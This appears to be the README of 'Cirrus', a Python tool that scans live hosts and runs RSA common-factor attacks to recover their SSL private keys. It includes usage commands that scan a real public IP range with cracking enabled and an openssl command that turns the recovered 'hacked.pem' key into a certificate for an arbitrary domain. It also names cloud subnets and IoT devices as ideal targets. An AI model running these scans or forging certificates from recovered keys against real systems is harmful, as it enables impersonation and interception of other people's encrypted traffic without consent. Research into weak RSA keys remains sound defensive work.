# Cirrus

## Introduction
Cirrus is an easy-to-use python script that launches RSA common factor attacks on live hosts. If a pair of hosts are found to contain a common factor in their moduli, two SSL private keys are created in the current directory in PEM format. These keys can be converted to working SSL certificates using OpenSSL:

```
openssl req -key hacked.pem -new -x509 -days 365 -out certificate.crt -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US'
```
Ideal targets for Cirrus include:

* Subnets belonging to cloud hosting providers who clone the same VM over and over again.
* Subnets of virtual servers in general.
* IoT devices.

There is a nonzero probability that at least two targets in a large group of hosts falling into any of the above categories share a common RSA key factor. 

## Usage
Targets are specified to Cirrus by either providing an IP range or by providing a list of hosts to scan. 

```
usage: Cirrus.py [-h] [-t THREADS] [-ip [IPRANGE [IPRANGE ...]]] [-l LISTNAME]
                 [-lk LOADLIST] [-sk SAVELIST] [-c] [-to TIMEOUT]

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            number of threads to scan with
  -ip [IPRANGE [IPRANGE ...]]
                        IP range to scan, specify with [from] [to]
  -l LISTNAME           list of hosts to scan
  -lk LOADLIST          load list of saved keys from file
  -sk SAVELIST          save list of saved keys to file
  -c                    crack loaded RSA keys
  -to TIMEOUT           timeout in seconds before terminating connections
```
```
python Cirrus.py -c -to 2 -ip 204.79.197.200 204.79.198.250 -to 2 -t 10
```
```
python Cirrus.py -l targets.txt -c
```
If you are interested in launching common factor attacks against absurdly large swaths of the Internet, check out the [EFF SSL Observatory](https://www.eff.org/observatory).
